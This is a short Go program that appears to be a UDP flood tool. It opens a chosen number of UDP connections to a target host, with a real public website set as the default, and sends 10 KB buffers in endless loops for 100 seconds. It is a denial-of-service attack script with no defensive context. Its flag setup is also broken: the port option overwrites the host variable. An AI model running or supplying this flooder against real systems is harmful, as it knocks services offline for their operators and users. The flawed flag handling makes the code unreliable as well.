package main

import(
	"fmt"
	"time"
	"flag"
	"net"
)

var(
	inputThread int
	inputDisHost string
	inputDisPort string

	data = make([]byte, 10240)
)

func init(){
	flag.IntVar(&inputThread, "w", 1, "Thread number")
	flag.StringVar(&inputDisHost, "host", "www.baidu.com", "dist host")
	flag.StringVar(&inputDisHost, "port", "80", "Dist port")
	flag.Parse()
}

func Send(c net.Conn){
	for{
		c.Write(data)
	}
}

func main(){

	for i := 0; i < inputThread; i++{
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", inputDisHost, inputDisPort))
		if err != nil {
			panic("conn error")
		}
		go Send(conn)
	}

	time.Sleep(time.Second * 100)
}